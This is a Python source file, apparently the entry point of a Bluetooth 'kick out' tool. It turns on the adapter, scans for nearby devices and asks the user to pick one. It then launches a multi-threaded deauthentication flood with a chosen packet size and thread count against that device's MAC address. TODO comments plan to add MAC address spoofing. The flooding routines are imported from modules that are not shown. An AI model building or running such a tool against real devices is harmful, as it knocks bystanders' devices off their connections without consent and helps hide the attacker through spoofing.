import time 
import os
import asyncio
import subprocess

from rich import print
from rich.prompt import Prompt
from rich.console import Console

from .utils.logo import print_logo
from .utils.kick import _kick_, deauth_Method_1, deauth_Method_2
from .utils.scanner import main, scan_devices

# modules = """[bright_white] [1] :mag: Scan for Bluetooth Devices
#  [2] :satellite: Kick Out Bluetooth Devices
# [red] [Q] :door: Exit (Ctrl + c)
# """

#TODO add more text (for example for turning on bluetooth or if no bluetooth adapter is found)
#TODO interactive choices with curses (like nvtop)
#TODO remove useless dependencies like asyncio ?
#TODO remove dotenv and .env ; Symplifying usage by getting adress from user input during runtime
#TODO ask for package size and threads count with default values
#TODO GET MAC addr automatically for spoofing
#TODO change spoofing method (ifconfig deprecated)

def Main_Modules():
    print_logo()
    
    # Turns Bluetooth Adapter - ON
    os.system("rfkill unblock bluetooth")
    os.system("bluetoothctl power on")
    time.sleep(2)
    
    # Start Bluetooth Scan
    mac_addr = asyncio.run(main())
    print(f"[yellow] :satellite: Selected Device [{mac_addr}]")

    # TODO Ask for method 1 or 2

    # Ask for packet size and threads count ( default values of 600 and 100 )
    packet_size = Prompt.ask("[red] :question: Enter the packet size (600)", default=600)
    threads_count = Prompt.ask("[red] :question: Enter the threads count (100)", default=100)

    # Start attack
    _kick_(deauth_Method_1, mac_addr, int(packet_size), int(threads_count))